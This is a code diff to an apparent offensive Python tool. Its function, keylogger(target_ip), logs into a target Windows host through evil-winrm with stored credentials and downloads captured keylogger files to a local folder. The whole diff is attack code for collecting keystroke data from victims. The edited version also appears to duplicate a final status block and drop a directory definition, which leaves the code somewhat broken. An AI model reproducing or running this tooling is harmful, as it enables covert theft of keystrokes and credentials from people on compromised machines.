@@ -146,7 +146,6 @@ def keylogger(target_ip):
     try:
         import os
         
-        REMOTE_DIR = "C:\\\\Users\\\\Public\\\\Logs"
         LOCAL_DIR = f"./Box/keylogger_{target_ip}"
         
         # Create local directory if it doesn't exist
@@ -186,25 +185,28 @@ def keylogger(target_ip):
                 continue
             
             local_path = os.path.join(LOCAL_DIR, local_filename)
-            # Use Popen to interact with evil-winrm shell properly
-            payload = f'download "{remote_file}" "{local_path}"\nexit\n'
+            payload = f'download "{remote_file}" "{local_path}"'
             
-            proc = subprocess.Popen(
+            subprocess.run(
                 ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
-                stdin=subprocess.PIPE,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
+                input=payload,
+                text=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
             )
             
-            stdout, stderr = proc.communicate(input=payload)
+            time.sleep(1)  # give a moment for file to be written
             
-            # Check if file was actually created
             if os.path.exists(local_path):
                 print(f"[+] Downloaded {local_filename}")
                 downloaded_count += 1
             else:
                 print(f"[-] Failed to download {local_filename}")
+        
+        if downloaded_count == 0:
+            print("[*] All files already downloaded")
+        else:
+            print(f"[+] Downloaded {downloaded_count} new file(s) to {LOCAL_DIR}/")
         
         if downloaded_count == 0:
             print("[*] All files already downloaded")
